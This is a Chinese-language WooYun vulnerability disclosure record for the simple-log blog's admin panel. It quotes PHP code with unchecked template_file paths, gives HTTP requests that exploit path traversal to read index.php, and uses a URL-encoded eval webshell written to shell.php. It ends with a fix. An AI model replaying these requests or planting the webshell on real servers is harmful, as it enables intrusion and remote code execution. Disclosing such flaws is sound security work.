{"id": 11752, "wybug_id": "wooyun-2013-021232", "wybug_title": "simple-log后台任意文件读写漏洞", "wybug_corp": "simple-log", "wybug_author": "风眼哥", "wybug_date": "2013-04-04 22:14", "wybug_open_date": "2013-07-03 22:14", "wybug_type": "任意文件遍历/下载", "wybug_level": "低", "wybug_rank_0": "5", "wybug_status": "未联系到厂商或者厂商积极忽略", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["第三方不可信程序", "任意文件读取利用", "文件操作参数未加过滤", "源码审核", "文件操作参数未过滤", "任意文件写入利用"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2013-04-04：\t积极联系厂商并且等待厂商认领中，细节不对外公开\t\t\t\t\t\t\t\t\t2013-07-03：\t厂商已经主动忽略漏洞，细节向公众公开  简要描述： simple-log在后台某处没有对参数进行检查导致任意文件读写产生 详细说明：  在/admin/includes/set_page.php中：产生读任意文件的地方：\nelseif ($action=='get_page_data'){\trequire(PBBLOG_ROOT . '/includes/json.class.php');\t$json   = new JSON;\t$file=$_POST['template_file'];\t$res=array('type'=>'get_page_data','content'=>'','error'=>'no');\t$data=file_get_contents(PBBLOG_ROOT.'/themes/'.$config['template_name'].'/'.$file);\t$res['content']=$data;\tdie($json->encode($res));}\n$_POST['template_file']被传给了$file然后直接字符串拼接进入file_get_contents中导致读任意文件漏洞的产生产生写任意文件的地方：\nelseif ($action=='act_set_page'){\t$data=htmlspecialchars_decode(stripslashes($_POST['data']));\t$file=$_POST['template_file'];\t$fp=@fopen(PBBLOG_ROOT.'/themes/'.$config['template_name'].'/'.$file,\"w\") or die('can not open file');\tflock($fp,LOCK_EX);\tfwrite($fp,$data);\tfclose($fp);\tclear_tpl();\tsys_message('页面修改成功','admin.php?act=set_footer&file='.$file);}\n同理也是$_POST['template_file']被传给了$file然后直接字符串拼接进入file_get_contents中导致写任意文件漏洞的产生   漏洞证明：  读index.php文件\nPOST /simple-log/admin/admin.php?act=get_page_data HTTP/1.1Host: xxxUser-Agent: xxxAccept: application/json, text/javascript, */*Accept-Language: zh-cn,zh;q=0.8,en-us;q=0.5,en;q=0.3Accept-Encoding: gzip, deflateContent-Type: application/x-www-form-urlencoded; charset=UTF-8X-Requested-With: XMLHttpRequestReferer: http://xxx/simple-log/admin/admin.php?act=set_footer&file=blog.htmlContent-Length: 23Cookie: xxxConnection: keep-alivePragma: no-cacheCache-Control: no-cachetemplate_file=../index.php\n写一句话到根目录下shell.php\nPOST /simple-log/admin/admin.php?act=act_set_page HTTP/1.1Host: target.comUser-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:18.0) Gecko/20100101 Firefox/18.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Language: zh-cn,zh;q=0.8,en-us;q=0.5,en;q=0.3Accept-Encoding: gzip, deflateReferer: http://target.com/simple-log/admin/admin.php?act=set_footerCookie: CNZZDATA1702264=cnzz_eid%3D1919140847-1364978684-http%253A%252F%252F192.168.189.134%26ntime%3D1364978684%26cnzz_a%3D5%26retime%3D1364978721191%26sin%3Dnone%26ltime%3D1364978721191%26rtime%3D0; PHPSESSID=ic36fuhn6urslbfb8dom2ml936; T3_lang=zh-cnConnection: keep-aliveContent-Type: application/x-www-form-urlencodedContent-Length: 155template_file=../../shell.php&data=%3C%3Fphp%0D%0A%40eval%28%24_POST%5B%27test%27%5D%29%3B%0D%0A%3F%3E&type=set_footer&file=footer.html&button=%E4%BF%AE%E6%94%B9\n   修复方案：  对传入的变量进行检查，不允许..存在   版权声明：转载请注明来源 风眼哥@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 未能联系到厂商或者厂商积极拒绝 漏洞Rank：6 (WooYun评价)  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "未能联系到厂商或者厂商积极拒绝", "wybug_rank_fromcorp": 6, "Ranks": null}